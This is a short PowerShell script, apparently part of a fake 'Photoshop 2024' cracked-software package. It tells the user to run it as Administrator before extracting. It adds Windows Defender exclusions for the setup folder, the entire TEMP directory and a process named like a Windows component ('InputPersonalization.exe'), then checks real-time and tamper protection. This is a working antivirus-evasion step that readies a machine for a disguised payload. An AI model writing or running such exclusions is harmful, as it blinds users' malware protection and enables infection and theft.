# ===========================================================================
# test_setup.ps1 — add AV exclusions BEFORE extracting (run as Administrator)
# ===========================================================================
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\Photoshop_2024_Setup"
Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\InputPersonalization"
Add-MpPreference -ExclusionPath "$env:TEMP"
Add-MpPreference -ExclusionProcess "Photoshop_2024_Setup.exe"
Add-MpPreference -ExclusionProcess "InputPersonalization.exe"

Write-Host "[*] Current exclusions:"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess

Write-Host "[*] Defender state:"
Get-MpComputerStatus | Format-List AMServiceEnabled, RealTimeProtectionEnabled, IsTamperProtected
